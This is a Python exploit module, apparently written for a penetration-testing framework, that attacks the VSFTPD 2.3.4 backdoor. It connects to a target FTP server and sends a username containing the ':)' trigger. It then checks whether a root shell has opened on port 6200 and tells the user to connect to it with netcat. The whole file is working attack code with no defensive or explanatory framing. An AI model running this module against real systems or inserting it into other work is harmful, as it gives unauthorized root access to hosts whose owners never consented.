import socket
import time
from core.base_module import BaseModule
from rich.console import Console

class Vsftpd234Backdoor(BaseModule):
    """Exploits the VSFTPD 2.3.4 backdoor command execution vulnerability."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['127.0.0.1', 'The remote host to target.'],
            'RPORT': ['21', 'The remote port of the VSFTPD service.']
        }

    def run(self, options):
        """
        Executes the exploit.
        """
        rhost = options.get('RHOST')
        rport_str = options.get('RPORT')
        console = Console()

        if not rhost:
            console.print("[!] RHOST option not set.", style="bold red")
            return
        
        try:
            rport = int(rport_str)
        except ValueError:
            console.print("[!] Invalid RPORT. Must be an integer.", style="bold red")
            return

        try:
            console.print(f"[*] Connecting to {rhost}:{rport}...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((rhost, rport))
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                console.print(f"[+] Connected. Banner: {banner}")

                if 'vsFTPd 2.3.4' not in banner:
                    console.print("[yellow][-] Target does not appear to be VSFTPD 2.3.4. The exploit may not work.[/yellow]")

                # Send the user command with the backdoor trigger :)
                s.send(b'USER backdoored:)\n')
                s.recv(1024)
                s.send(b'PASS whatever\n')
                time.sleep(1) # Give the backdoor a moment to spawn

            # Check if the backdoor shell is open on port 6200
            console.print("[*] Attempting to connect to the backdoor on port 6200...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as shell_socket:
                shell_socket.settimeout(5)
                result = shell_socket.connect_ex((rhost, 6200))

                if result == 0:
                    console.print("[bold green][+] Success! Backdoor is open on port 6200.[/bold green]")
                    console.print("[bold green][+] You can now connect to it manually (e.g., `nc {rhost} 6200`) to get a root shell.[/bold green]")
                else:
                    console.print("[bold red][-] Exploit failed. The backdoor shell did not open on port 6200.[/bold red]")

        except socket.timeout:
            console.print("[!] Connection timed out.", style="bold red")
        except socket.error as e:
            console.print(f"[!] A socket error occurred: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
